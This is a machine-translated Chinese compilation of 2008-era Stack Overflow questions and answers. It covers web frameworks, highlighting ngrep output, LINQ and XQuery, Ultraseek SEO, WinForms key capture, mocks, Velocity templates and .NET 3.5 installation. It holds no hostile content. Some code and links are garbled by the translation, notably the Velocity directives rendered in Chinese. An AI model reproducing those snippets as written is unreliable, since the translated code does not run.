我目前使用 ASP.NET MVC，我将在接下来的几个月中将我的专业开发工作转向它。在过去的十年中，我接触了许多语言和 Web 框架。C# 是一门非常成熟和强大的语言，asp.net mvc 框架似乎和我一起点击。我将继续使用 jquery 作为我的主要 javascript 库。业余时间我也会继续玩python/django等解决方案。

我只是喜欢 c#，所以这可能是我选择 asp.net mvc 而不是其他解决方案的原因。

似乎 MS 终于想出了一些不错的东西（考虑到 asp.net 网络表单的混乱......相当了不起）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-17T22:36:05.670

我发现[Google App Engine](http://code.google.com/appengine/)真的很舒服（Python 作为服务器语言，Google Datastore 作为数据库，许多现成的对象，例如内存缓存、用户 API 等）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-17T22:45:41.360

我是 ColdFusion 的粉丝，它建立在 Java 之上，但更关注 RAD/Agile。有来自 Adob​​e 的参考实现，但也有可用的 CFML 语言的三个开源实现。

ColdFusion 特别擅长作为“胶水”技术，提供对 Flash/ActionScript 服务、Java 集成、.Net 集成、Web 服务和使用任何 JDBC 数据源的 SQL 数据库集成的访问。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-18T05:29:42.353

我使用[Ramaze](http://ramaze.net/)，一个漂亮的 Ruby Web 框架。将它与[M4DBI相结合，这是一个构建在](http://purepistos.net/m4dbi)[Ruby DBI](http://ruby-dbi.rubyforge.org/)之上的 Ruby ORM 。对于 JS 工作，尽可能使用 [jQuery （我避免像瘟疫一样使用普通的 JS！）。](http://jquery.com/)[PostgreSQL](http://www.postgresql.org/)是我选择的数据库。

我有使用 Rails、mod_ruby、JDBC、ODBC、PHP 和“普通”网站（HTML、CSS、JS）的经验，但我对上面列出的用于我的 Web 应用程序堆栈的软件非常满意。

我相信 Ramaze 可以在 JRuby 下运行。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-18T05:54:39.480

您是在谈论“网站”还是更丰富的东西，例如后台应用程序（大量控件和字段以及复杂的工作流程）？

如果你谈论的是一个网站，更面向内容的东西，并且你想坚持使用 Java，我投票给 Stripes——它在所有（至少大部分）荣耀中都包含 HTTP，它不会妨碍你，并且非常灵活。我们利用 JSP 和 JSP 标记文件在 Stripes 之上编写了一个非常好的框架。我们可以很快淘汰屏幕。

如果您有一个更复杂的应用程序，请考虑其中一个组件框架。Wicket 非常流行，但是 JSF 有很多工具和小部件，并且可以与 Seam 一起使用，获得了好评如潮。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-10-18T06:02:18.997

如果我从头开始，我仍然会环顾与我一起工作的团队，看看他们知道什么。团队中没有人知道的平台是错误的平台。对于生产工作，坚持你所知道的，除非有迫切的原因你必须改变。

如果您决心学习新东西，我建议您使用 Ruby on Rails。在短短几年内，它已成为将其他系统与其他系统进行比较的主要里程碑之一：“我使用 xyz，它就像 rails，除了......” 仅此一项就说明了它对 Web 开发社区的影响。Ruby 为您提供了一种非常强大的服务器端脚本语言，而 Rail 允许快速开发高质量的应用程序。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-18T09:25:53.250

如果你想要干净简单的东西，不要使用 Rails，使用[Ramaze](http://ramaze.net)。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-19T20:19:05.147

[Stripes](http://www.stripesframework.org)是一个很棒的框架，因为它可以让您快速轻松地构建应用程序，而无需维护配置文件。通常，您创建一个操作 bean（一个简单的 Java 类）来完成工作，并创建一个 JSP 来显示结果。您使用注释添加验证。您可以获得大多数常见类型的内置类型转换，并且可以轻松编写自己的类型转换器。拦截器为您提供了一种解决横切关注点的简单方法。简而言之，我发现它是目前最简单、直观、一致、强大和灵活的框架之一。

对于其余的堆栈，这完全取决于您。很容易将 Spring、Hibernate、JPA、AJAX、安全、单元测试等与 Stripes 集成。如果您想查看演示所有这些的示例代码，请获取 Stripes 书籍的代码[包](http://www.pragprog.com/titles/fdstr)[并](http://www.pragprog.com/titles/fdstr/code)打开 index.html 文件以获取所有示例的列表。这样，您就可以了解 Stripes 应用程序的外观。

祝你项目好运！

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-20T04:32:23.123

Grails ( [http://grails.org](http://grails.org) ) 可能是当今最有趣的新 Web 开发环境。它建立在以下基础之上：

Spring
Groovy
Sitemesh
Hibernate
Quartz

它也可以通过插件进行扩展

[http://grails.org/Plugins](http://grails.org/Plugins)

您可以观看一些截屏视频以了解该功能。

[http://grails.org/Grails+Screencasts](http://grails.org/Grails+Screencasts)

一件非常吸引我的事情是 Grails 可以很容易地集成到现有的 Java/JSP 项目中。无需从头开始重写项目。

如果您没有任何遗留代码或者 Java 不是您的日常工作，我认为 Ruby on Rails 将是一个不错的选择。

最后，我喜欢能够将 Grails 项目部署到应用程序服务器（如 Tomcat、WebSphere、Glassfish 等）的想法。这些系统非常可靠并且可扩展性很好。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-20T04:53:16.717

我考虑了每个人在这里提出的大多数选择：Ruby on Rails、Groovy on Grails、Python/Django，然后是 Java 中的 Spring MVC 框架。我最终选择了 Ruby on Rails。

为什么？首先，我需要能够快速灵活地开发功能。这对 Java 不利。其次，我需要开发一个网站而不是后台应用程序。所以 UI 不需要非常复杂。一个简单的 CRUD 应用程序包装数据库并将其绘制在浏览器上就足够了。这决定性地排除了 Java。

所以我留下了一个动态语言框架。我试用了 Groovy。由于我不需要与 Java 的互操作性，这排除了它的优势（是的，我知道 JRuby 是可互操作的，但 Groovy 仍然有'{}'）。在 Groovy 中对某些东西进行原型设计后，我注意到堆栈跟踪并不总是对调试有启发性，而且与我的 Rails 原型相比，性能很慢。这消除了 Groovy。

考虑过使用 Python/Django，但我注意到让其他人加入会更加困难，因为 RoR >> Python/Django 中的书籍数量庞大。或许我本可以进一步考虑 Python/Django，但现在是做决定的时候了，我选择了 RoR。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-17T22:37:36.103

用于 java 开发，Eclipse 或 Net beans；对于 html/css/js netbeans 和有时 Dreamweaver 检查浏览器对属性的支持；对于 xml/xslt/xsi Altova xml spy；对于 PNG 文件 Adob​​e 烟花；适用于所有通用文本编辑 GVIM。不要忘记“Firebug”和“IE 开发者工具栏”。

他们为什么摇滚？Java 的代码完成、可追溯性和所见即所得的体验是让它们为我打勾的原因。明天如果有新工具出现并且学习曲线更短，我不会害羞！

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-17T23:57:18.390

*[提升](http://liftweb.net/index.php/Main_Page)*，因为这是在[Scala中编写代码的机会](http://www.scala-lang.org/)

# python - 如何围绕 ngrep 编写一个突出显示匹配项的包装器？

> ID：214059
> 
> 赞同：2
> 
> 时间：2008-10-17T22:32:58.467
> 
> 标签：python, perl, unix, networking

我刚刚了解了[ngrep](http://ngrep.sourceforge.net/)，这是一个很酷的程序，可让您轻松嗅探与特定字符串匹配的数据包。

唯一的问题是很难在输出的大块中看到匹配项。我想编写一个包装脚本来突出显示这些匹配项——它可以使用 ANSI 转义序列：

```
echo -e 'This is \e[31mRED\e[0m.' 
```

我最熟悉 Perl，但我对 Python 或任何其他语言的解决方案非常满意。最简单的方法是这样的：

```
while (<STDIN>) {
   s/$keyword/\e[31m$keyword\e[0m/g;
   print;
} 
```

但是，这不是一个好的解决方案，因为 ngrep 会在收到不匹配的数据包时打印出没有换行符的哈希标记，并且上面的代码将禁止打印这些哈希标记，直到脚本看到换行符为止。

有什么方法可以在不抑制主题标记的即时出现的情况下进行突出显示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T08:57:37.350

这似乎可以解决问题，至少比较两个窗口，一个运行直接的 ngrep（例如，ngrep 什么），一个被管道传输到以下程序（使用 ngrep 不管 | ngrephl 目标字符串）。

```
#! /usr/bin/perl

use strict;
use warnings;

$| = 1; # autoflush on

my $keyword = shift or die "No pattern specified\n";
my $cache   = '';

while (read STDIN, my $ch, 1) {
    if ($ch eq '#') {
        $cache =~ s/($keyword)/\e[31m$1\e[0m/g;
        syswrite STDOUT, "$cache$ch";
        $cache = '';
    }
    else {
        $cache .= $ch;
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T23:30:24.623

啊，算了。这太痛苦了。将源代码获取到 ngrep 并使其将哈希标记打印到 stderr 要容易得多：

```
--- ngrep.c     2006-11-28 05:38:43.000000000 -0800
+++ ngrep.c.new 2008-10-17 16:28:29.000000000 -0700
@@ -687,8 +687,7 @@
     }

     if (quiet < 1) {
-        printf("#");
-        fflush(stdout);
+      fprintf (stderr, "#");
     }

     switch (ip_proto) { 
```

然后，过滤是小菜一碟：

```
while (<CMD>) {
  s/($keyword)/\e[93m$1\e[0m/g;
  print;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-18T04:13:42.227

您还可以通过[ack](http://petdance.com/ack/)管道输出。--passthru 标志会有所帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T23:12:53.597

[如果你有这个问题](https://stackoverflow.com/questions/213901/in-perl-how-do-i-process-input-as-soon-as-it-arrives-instead-of-waiting-for-new)的答案应该不会太难。

（基本上，一次读取一个字符，如果是散列，则打印它。如果不是散列，则保存该字符以供以后打印。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T23:40:02.637

这在 python 中很容易。

```
#!/usr/bin/env python
import sys, re

keyword = 'RED'

while 1:
    c = sys.stdin.read(1)
    if not c:
        break
    if c in '#\n':
        sys.stdout.write(c)
    else:
        sys.stdout.write(
            (c+sys.stdin.readline()).replace(
            keyword, '\x1b[31m%s\x1b[0m\r' % keyword)) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-04T20:08:55.850

为什么不直接使用 -q 参数调用 ngrep 来消除哈希标记？

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-10-18T05:30:13.353

请参阅这篇关于 Linux-IL 的帖子中的脚本，[其中有人提出了类似的问题](http://www.mail-archive.com/linux-il@cs.huji.ac.il/msg52876.html)。它是用 Perl 编写的，并使用 CPAN Term::ANSIColor 模块。

# linq - 在 Linq To SQL 中使用 XQuery？

> ID：214060
> 
> 赞同：15
> 
> 时间：2008-10-17T22:33:36.970
> 
> 标签：linq, sql-server-2005, linq-to-sql, xquery

假设我有一个包含 XML 类型数据列的表。在 SQL 中，我可以执行以下语句：

```
select   top 10  *,
         Content.value('(/root/item/value)[1]', 'float') as Value
from     xmltabletest
where    Content.value('(/root/item/MessageType)[1]', 'int') = 1 
```

结果集仅包含符合条件的记录，它从 XML 中提取一个值到名为“值”的列中。很好很简单。

使用 Linq To SQL 可以实现相同的目标吗？

我想让 SQL 来完成繁重的工作，并且只返回符合我的标准的数据，而不必选择、传输然后处理可能大量的数据。据我所知，目前这是不可能的，但我想我应该问一下。

（如果有帮助，环境是 .NET 3.5、VS2008、SQL Server 2005）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-21T22:18:32.847

我不确定这是否已经过时了，但根据[Scott Guthrie](http://weblogs.asp.net/scottgu/archive/2007/05/29/linq-to-sql-part-2-defining-our-data-model-classes.aspx#2691097) ， XML 数据类型是：

> 在 LINQ to SQL 实体中表示为字符串。您可以使用 XLINQ 查询 LINQ to SQL 实体中的 XML 列 - 但这种查询将发生在您的中间层（在 ASP.NET 中）。您不能对数据库执行远程 XQuery 并根据第一个版本中的结果过滤返回的结果。

所以在回答你的问题时，我会说“不”。

# optimization - Ultraseek 5.7 的 SEO

> ID：214061
> 
> 赞同：0
> 
> 时间：2008-10-17T22:34:30.507
> 
> 标签：optimization, search, seo, web-crawler, ultraseek

我们已经让 Ultraseek 5.7 索引我们公司内部网站上的内容，并且我们希望确保我们的网页已针对它进行了优化。

哪些 SEO 技术对 Ultraseek 有用，我在哪里可以找到有关这些功能的文档？

我考虑实现的功能：

*   让title和first H1包含页面最有价值的信息
*   实现一个 sitemap.xml 文件
*   添加新内容时 Ping Ultraseek xpa 界面
*   使用“SEO 友好”的 URL 字符串
*   将 Meta 关键字添加到 HTML 页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-04-22T07:10:09.257

在为搜索引擎优化网站以及对 Ultraseek 等工具优化网站时，任何人都能得到的最重要的建议是……

首先为您的人类受众编写您的网页。不要做任何奇怪的事情来尝试为搜索引擎优化您的网站。如果这会使 URL 变得不那么明智，请不要将关键字填充到您的 URL 中。先想想人。

话虽如此，以下技术通常会让人类和机器都变得更好！

1.  使用标题（h1 到 h6）给你的页面一个结构。想象它们被排列在一个树形视图中，其中一个 h1 包含一些 h2 标签，而 h2 标签包含 h3 标签等等。我通常使用 h1 标签（应该只有一个 h1 标签）作为站点名称，使用 h2 标签作为页面名称，并在适当的地方使用 h3 标签作为子标题。

2.  站点地图非常有用，因为它们包含您的页面列表，请考虑这是您希望包含在任何索引中的页面的请求。不过，它们通常不包含太多上下文。

3.  友好的 URL 字符串非常适合人类。我更愿意访问 www.website.com/Category/Music/ 而不是 www.website.com?x=3489 - 这也意味着您可以为机器提供更多页面上下文。如果 URL 与您的 h1 和 h2 标签匹配，它尤其有用。像这样：

    www.website.com/Category/Music/

    # 网站

    ## 类别：音乐

    欢迎来到音乐类！

4.  Meta keywords (and description) are useful - but as per the above advice, you need to make sure that it all matches up. Use a small but targeted set of keywords that highlight what is specifically different about the page and make sure your description is a good summary of the page content. Imagine that it is used beneath the title in a list of search results (even though it might not be!)

5.  Navigation! Providing clear navigation, as well as back links (such as bread-crumbs) will always help. If someone clicks on a search result, it might not be the exact page they are after, but it may well be very close. By highlighting where people have landed in your navigation and by providing a bread-crumb that tells them where they are, they will be able to traverse your pages easily even if the search hasn't taken them to the perfect location.

# c# - 捕获按键消息

> ID：214065
> 
> 赞同：1
> 
> 时间：2008-10-17T22:37:54.683
> 
> 标签：c#, .net, winforms, winapi

我们正在为内部信息亭构建一些软件。该软件是一个带有嵌入式浏览器的基本 .net windows 窗体。Kiosk 配备了用户踩上去的垫子。当用户踩到垫子上时，它会通过键盘发送一个键位。当用户离开垫子时，它会发送一个不同的组合键。

我们要做的是在我们的应用程序中查找组合键，并根据用户是否踩踏，使浏览器转到不同的 url。

您如何连接键盘以适应这种情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T23:21:35.420

如果您的窗口是活动窗口，那么您可以简单地覆盖表单 ProcessCmdKey，如下所示。

```
protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
{
    const int WM_KEYDOWN = 0x100;
    const int WM_SYSKEYDOWN = 0x104;

    if ((msg.Msg == WM_KEYDOWN) || (msg.Msg == WM_SYSKEYDOWN))
    {
        switch (keyData)
        {
            case Keys.Down:
                this.Text = "Down Arrow Captured";
                break;

            case Keys.Up:
                this.Text = "Up Arrow Captured";
                break;

            case Keys.Tab:
                this.Text = "Tab Key Captured";
                break;

            case Keys.Control | Keys.M:
                this.Text = "<CTRL> + M Captured";
                break;

            case Keys.Alt | Keys.Z:
                this.Text = "<ALT> + Z Captured";
                break;
        }
    }

    return base.ProcessCmdKey(ref msg, keyData);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T22:53:01.377

不久前，我正在对 USB 读卡器进行类似的搜索。

我[在 CodeProject 上看到了这篇文章，](http://www.codeproject.com/KB/system/rawinput.aspx)用于处理设备的原始输入。

我的主要目标是区分充当键盘的多种设备。您的设备可能有不同的界面。它也可能有 SDK 和文档。我们不知道。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T01:16:20.573

如果您的应用程序不是主窗口，请查看[RegisterHotkey](http://msdn.microsoft.com/en-us/library/ms646309.aspx) Win32 API，这里有一些关于[p/invoke](http://pinvoke.net/default.aspx/user32/RegisterHotKey.html)的信息。

# javascript - Ext Js 和 Adob e Air

> ID：214072
> 
> 赞同：3
> 
> 时间：2008-10-17T22:42:13.957
> 
> 标签：javascript, ajax, web-applications, air, extjs

谁能推荐一些关于 ext js 和 adobe air 的好教程？我看到的那些似乎是从您了解很多或已经有很多代码开始的。

我正在寻找的是一个简单的分步指南，它将带您了解与 adobe air 一起使用的 Ext Js 的基础知识，事实上，我想对于初学者来说，一个好的 Ext Js 教程会很方便，我只是找不到任何东西。

我正在寻找构建一个桌面应用程序并且需要快速上手，但 Js 是我的弱点，并且该应用程序有一些复杂性（他们总是不知道！！）。

所以问题 - 对于初学者来说最好的 Ext Js 教程是什么（最好是加入一些 adobe 空气，但不是本质上，一次一步;））

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T01:44:32.543

我发现最好的教程都在 Ext JS 网站上。

[Ext JS 介绍教程](http://extjs.com/learn/Tutorial:Introduction_to_Ext_2.0)

Ext JS 是一个大型 JS 库，其中包括从标准 DOM 操作到最全面的 JavaScript UI 组件集之一的许多功能。由于它是一个需要学习的大型 API，我发现查看示例和相关的源代码是学习的最佳方式。

[Ext JS 示例](http://extjs.com/deploy/dev/examples/samples.html)

易于访问 Ext JS API 文档很方便，而且 Jack Slocum 的 Ext JS Docs AIR 应用程序也不错。

[Ext JS API 文档 AIR App](http://jackslocum.com/blog/2008/02/14/air-docs/)

如果您的 JS 不是太强大，您可能需要考虑使用不同的 JavaScript 库/框架。Ext JS 很棒，有些人认为它至少从 UI 组件的角度来看是目前质量最高的 JS 库/框架，但由于它太大了，因此需要一些时间来掌握它。如果您只打算使用几个 UI 组件，那么您可能没问题，但是一旦您进入包含许多组件和布局的更复杂的 UI，它就会相当复杂。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-30T08:52:36.427

我可以建议的另一个最佳资源是 www.adobeairtutorials.com

# c# - C# 3.0 匿名类型：命名

> ID：214077
> 
> 赞同：3
> 
> 时间：2008-10-17T22:44:30.457
> 
> 标签：c#, naming, anonymous-types, .net-3.0

我想知道是否有某种方法可以命名或重命名匿名类型的属性以在属性名称中包含空格。例如：

```
var resultSet = from customer in customerList
    select new 
    {
       FirstName = customer.firstName;
    }; 
```

在此示例中，我希望 FirstName 为“First Name”。这个问题的原因是我有一个用户控件，它公开了一个我绑定到不同匿名类型的公共 DataSource 属性。它现在工作得很好，除了列名有点不友好（名字而不是名字）的一个小缺点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-17T23:55:07.273

做这样的事情怎么样：

```
var resultSet = from customer in customerList
                select new 
                {
                    Value = customer.firstName,
                    Title = "First Name"
                }; 
```

然后在您的用户控件中使用 Value 作为内容，使用 Title 作为列名。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T22:48:11.243

不，这是不可能的，成员名称中不允许有空格，您可以使用下划线或在数据绑定后以编程方式更改列的标题...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T22:57:59.307

我会在属性中添加一个属性，您可以在其中指定自定义名称，并且您可以使用该属性提供更多用户友好的名称。

# c# - 如何获取方法参数的名称？

> ID：214086
> 
> 赞同：37
> 
> 时间：2008-10-17T22:48:15.987
> 
> 标签：c#, .net, reflection

如果我有这样的方法：

```
public void MyMethod(int arg1, string arg2) 
```

我将如何获取参数的实际名称？我似乎在 MethodInfo 中找不到任何实际上会给我参数名称的东西。

我想写一个看起来像这样的方法：

```
public static string GetParamName(MethodInfo method, int index) 
```

因此，如果我使用以下方法调用此方法：

```
string name = GetParamName(MyMethod, 0) 
```

它将返回“arg1”。这可能吗？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2008-10-17T22:56:36.500

```
public static string GetParamName(System.Reflection.MethodInfo method, int index)
{
    string retVal = string.Empty;

    if (method != null && method.GetParameters().Length > index)
        retVal = method.GetParameters()[index].Name;

    return retVal;
} 
```

上面的示例应该可以满足您的需要。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-17T22:57:08.963

尝试这样的事情：

```
foreach(ParameterInfo pParameter in pMethod.GetParameters())
{
    //Position of parameter in method
    pParameter.Position;

    //Name of parameter type
    pParameter.ParameterType.Name;

    //Name of parameter
    pParameter.Name;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-17T23:01:49.907

没有任何类型的错误检查：

```
public static string GetParameterName ( Delegate method , int index )
{
    return method.Method.GetParameters ( ) [ index ].Name ;
} 
```

您可以使用 'Func<TResult>' 和衍生物来使这项工作适用于大多数情况

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-11-16T13:05:59.510

`nameof(arg1)`将返回变量的名称`arg1`

[https://msdn.microsoft.com/en-us/library/dn986596.aspx](https://msdn.microsoft.com/en-us/library/dn986596.aspx)

# testing - 什么是模拟，什么时候应该使用它？

> ID：214092
> 
> 赞同：30
> 
> 时间：2008-10-17T22:49:50.633
> 
> 标签：testing, mocking, glossary

我刚刚阅读了关于[模拟对象](http://en.wikipedia.org/wiki/Mock_object)的维基百科文章，但我仍然不完全清楚它们的目的。当实际对象过于复杂或不可预测时，它们似乎是由测试框架创建的对象（您知道 100% 确定模拟对象的值是什么，因为您完全控制它们）。

但是，我的印象是所有测试都是使用已知值的对象完成的，所以我一定遗漏了一些东西。例如，在一个课程项目中，我们的任务是使用日历应用程序。我们的测试套件由我们确切知道它们是什么的事件对象组成，因此我们可以测试多个事件对象、各种子系统和用户界面之间的交互。我猜这些是模拟对象，但我不知道你为什么不这样做，因为没有已知值的对象，你就无法测试系统。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2008-10-17T22:56:06.533

模拟对象不仅仅是具有已知值的对象。它是一个对象，其接口与您不能在测试中使用的复杂对象（如数据库连接和结果集）具有相同的接口，但具有您可以在测试中控制的实现。

有一些模拟框架允许您即时创建这些对象，并且实质上允许您说以下内容：使用 foo 方法让我成为一个对象，该方法接受一个 int 并返回一个 bool。当我通过 0 时，它应该返回 true。然后您可以测试使用 foo() 的代码，以确保它做出适当的反应。

Martin Fowler 有一篇关于模拟的精彩文章：

*   [http://martinfowler.com/articles/mocksArentStubs.html](http://martinfowler.com/articles/mocksArentStubs.html)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-17T22:55:43.040

想想拥有客户端和服务器软件的经典案例。测试客户端，需要服务器；要测试服务器，您需要客户端。这使得单元测试几乎不可能 - 不使用模拟。如果你模拟服务器，你可以单独测试客户端，反之亦然。

模拟的重点不是复制它模拟的事物的行为。更多的是充当一个简单的状态机，其状态变化可以通过测试框架进行分析。因此，客户端模拟可能会生成测试数据，将其发送到服务器，然后分析响应。您期望对特定请求的特定响应，因此您可以测试是否得到它。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-17T23:12:22.303

我同意[@Lou Franco](https://stackoverflow.com/questions/214092/what-is-a-mock-and-when-should-you-use-it#214105)所说的一切，你绝对应该阅读@Lou Franco 指出的关于测试双打的优秀 Martin Fowler 文章。

任何测试替身（fake、stub 或 mock）的主要目的是隔离被测对象，以便您的单元测试仅测试该对象（而不是它的依赖项以及与之协作或交互的其他类型）。

可以使用提供对象所依赖的接口的对象来代替实际依赖项，以便可以预期某些交互将发生。这可能很有用，但围绕基于状态的测试与基于交互的测试存在一些争议。过度使用模拟期望会导致脆弱的测试。

测试替身的另一个原因是消除对数据库或文件系统或其他类型的依赖，这些类型的设置或执行耗时的操作非常昂贵。这意味着您可以将对感兴趣的对象进行单元测试所需的时间降至最低。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-04T11:50:53.597

这是一个示例：如果您正在编写填充数据库的代码，您可能需要检查特定方法是否已将数据添加到数据库中。

设置数据库副本进行测试存在的问题是，如果假设在调用被测方法之前没有记录，之后有一条记录，那么您需要将数据库回滚到以前的状态，从而增加了开销用于运行测试。

如果您假设只比以前多一条记录，它可能会与连接到同一数据库的第二个测试人员（甚至是同一代码中的第二个测试）发生冲突，从而导致依赖关系并使测试变得脆弱。

模拟允许您保持测试彼此独立并且易于设置。

这只是一个例子——我相信其他人可以提供更多。

我 100% 同意该主题的其他贡献者，尤其是对 Martin Fowler 文章的推荐。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-21T16:45:36.523

您可能对我们的书感兴趣，请参阅[http://www.growth-object-orientated-software.com/](http://www.growing-object-oriented-software.com/)。它在 Java 中，但这些想法仍然适用。

# java - 速度#parse，但将其分配给变量

> ID：214094
> 
> 赞同：10
> 
> 时间：2008-10-17T22:51:37.183
> 
> 标签：java, velocity, template-engine

假设您有一个包含（解析）页眉、正文、页脚模板的标准模板。

在正文模板中定义了一个像 $subject 这样的变量，并且您希望它也显示在标题模板中。

在其他一些模板语言中，例如 HTML::Mason(perl based)，您将首先评估 body 模板以获取 $subject 变量，但将其输出临时存储在变量中，以便您的最终输出以正确的顺序结束（标题，正文，页脚）

在速度方面，它看起来像

设置 ($body=#parse("body.vm"))

解析（“header.vm”）

${正文}

解析（“footer.vm”）

然而，这似乎不起作用，关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-31T02:47:25.040

上述两种解决方案中的任何一种都可以。VelocityLayoutServlet 解决方案需要一个名为 Velocity Tools 的额外包（也来自 Velocity）。我自己偏爱这种方法（和变体）。

第三种方法是简单地将#parse 放在引号内：

```
set ($body="#parse('body.vm')") 
```

在#set 中，对双引号中的任何内容进行评估。单引号内的字符串按字面意思传递。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-28T13:20:00.927

您可以使用[VelocityLayoutServlet](http://velocity.apache.org/tools/devel/view/layoutservlet.html)来做到这一点，它是[VelocityTools](http://velocity.apache.org/tools/devel/index.html)的一部分。

这允许您为您的应用程序定义一个布局——我们称之为布局`application.vm`——您可以在其中解析页眉、页脚等，并使用声明声明主体内容的放置位置`screen_content`，例如：

```
<html>
  <head>
    <title>$subject</title>
  </head>
  <body>
  #parse("header.vm") 
  $screen_content
  #parse("footer.vm") 
  </body>
</html> 
```

`VelocityLayoutServlet`将在渲染之前评估模板（以及变量），这允许您`$subject`在正文模板中设置变量，例如：

```
#set($subject = "My Subject")
<div id="content">
</div> 
```

更多详细信息可以[在 Velocity 文档](http://velocity.apache.org/tools/devel/view/layoutservlet.html)中找到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-30T05:31:31.247

如果我理解正确，您希望将一个名为 Velocity 的变量`$subject`插入到`header.vm`模板`body.vm`中。现在，该变量是在`body.vm`模板中定义的，因此您不能在之前的模板中引用它`header.vm`。

为什么不将 $subject 的定义抽象到它自己的模板片段中，称为`globals.vm`say，然后将其包含在顶级模板中。所以你会有：

```
#parse("globals.vm")
#parse("header.vm")
#parse("body.vm")
#parse("footer.vm") 
```

# .net-3.5 - .NET Framework 3.5 不会安装在 VISTA 32 位上

> ID：214099
> 
> 赞同：5
> 
> 时间：2008-10-17T22:52:43.577
> 
> 标签：.net-3.5, windows-vista, frameworks

运行 VISTA 32 位。

我正在尝试安装 c# Visual Express 2008 - 但它需要 .NET 3.5。安装期间的先决条件之一是 .NET 3.5 ...它尝试安装它但失败了，没有真正的错误消息。

所以我从 MS 网站下载了独立的 .NET 3.5 并尝试了。再次失败并出现错误

> [10/17/08,23:17:07] WapUI：[2] DepCheck 指示未安装 Microsoft .NET Framework 3.0SP1 (CBS)。[10/17/08,23:50:55] Microsoft .NET Framework 3.0SP1 (CBS)：[2] 错误：组件 Microsoft .NET Framework 3.0SP1 (CBS) 安装失败。MSI 返回错误代码 34

我目前安装了 c# Express 2005 版。但是我读到的所有内容都表明我可以将这两个应用程序安装在一起。我相信 2005 运行的是 Framework 2.0。2005 速成版运行良好。- 它只是 2008 版我在安装 .NET 3.5 时遇到问题......

有任何想法吗 ？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-19T13:55:23.847

.NET Framework 3.0 是与 Windows Vista 一起发布的组件。为了获得 .NET Framework 3.0 的 SP1，您必须安装**Windows Vista SP1**。.NET Framework 3.0 的独立 SP1 安装程序适用于本机没有它的操作系统。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T23:02:58.767

它不会自动为您安装 .NET 3.0 和 SP1，这有点奇怪。似乎错误在于它无法安装 .NET 3.0（3.5 的先决条件）。也许您可以尝试手动操作？（另外，请确保您没有安装预发布版本。）

使用下面的链接安装 .NET 3.0。

[.NET 3.0 可再发行包](http://www.microsoft.com/downloads/details.aspx?familyid=10CC340B-F857-4A14-83F5-25634C3BF043&displaylang=en)

然后，使用下面的链接跟进 .NET 3.0 SP1。

[.Net 3.0 服务包 1](http://www.microsoft.com/downloads/details.aspx?familyid=EC2CA85D-B255-4425-9E65-1E88A0BDB72A&displaylang=en)

之后，再次尝试运行安装。如果仍然失败，您也可以尝试手动安装 .NET 3.5 SP1。

[.NET 3.5 可再发行包](http://www.microsoft.com/downloads/details.aspx?familyid=333325FD-AE52-4E35-B531-508D977D32A6&displaylang=en)

[.NET 3.5 服务包 1](http://www.microsoft.com/downloads/details.aspx?familyid=AB99342F-5D1A-413D-8319-81DA479AB0D7&displaylang=en)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T23:02:11.887

您是否安装过 3.0 或 3.5 的任何预发布版本？在我意识到我已经安装了 WPF 的 CTP 之前，我在安装 3.5 时遇到了很多麻烦。在添加/删除程序中检查所有 Microsoft 和 .NET 安装，并确保您没有任何预发布版本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-21T10:11:43.237

莱拉——

[微软](http://social.msdn.microsoft.com/Forums/en-US/netfxsetup/thread/6f25986f-ff3c-4eef-96b0-91a8502791d3/)

显示有相同错误消息的人，最后是因为他们关闭了 Windows 更新服务。您不妨尝试一下。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-11-18T14:08:54.880

